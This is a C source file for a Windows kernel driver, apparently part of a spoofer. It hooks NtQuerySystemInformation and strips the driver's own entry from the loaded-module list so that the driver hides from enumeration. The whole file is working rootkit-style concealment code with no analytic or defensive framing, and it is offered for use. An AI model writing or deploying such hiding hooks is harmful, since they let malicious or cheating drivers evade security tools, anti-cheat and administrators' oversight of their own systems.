#include "common.h"
#include "hooks.h"
#include "module_hiding.h"

typedef NTSTATUS (*NTQUERYSYSTEMINFORMATION)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
NTQUERYSYSTEMINFORMATION g_OriginalNtQuerySystemInformation = NULL;
HOOK_INFO g_ModuleHideHook = {0};

typedef struct _SYSTEM_MODULE_ENTRY {
    PVOID  Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} SYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG ModulesCount;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION;

NTSTATUS HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS status = g_OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (!g_SpoofData.Enabled || !NT_SUCCESS(status) || SystemInformationClass != 0xB)
        return status;

    PSYSTEM_MODULE_INFORMATION modInfo = (PSYSTEM_MODULE_INFORMATION)SystemInformation;
    PVOID ourBase = g_DeviceObject->DriverObject->DriverStart;
    for (ULONG i = 0; i < modInfo->ModulesCount; i++) {
        if (modInfo->Modules[i].ImageBase == ourBase) {
            if (i < modInfo->ModulesCount - 1) {
                RtlMoveMemory(&modInfo->Modules[i], &modInfo->Modules[i+1],
                    (modInfo->ModulesCount - i - 1) * sizeof(SYSTEM_MODULE_ENTRY));
            }
            modInfo->ModulesCount--;
            if (ReturnLength) *ReturnLength -= sizeof(SYSTEM_MODULE_ENTRY);
            break;
        }
    }
    return status;
}

void InitModuleHiding() {
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"NtQuerySystemInformation");
    g_OriginalNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&name);
    if (g_OriginalNtQuerySystemInformation)
        InstallHookX64(g_OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation, &g_ModuleHideHook);
}

void CleanupModuleHiding() {
    RemoveHookX64(&g_ModuleHideHook);
}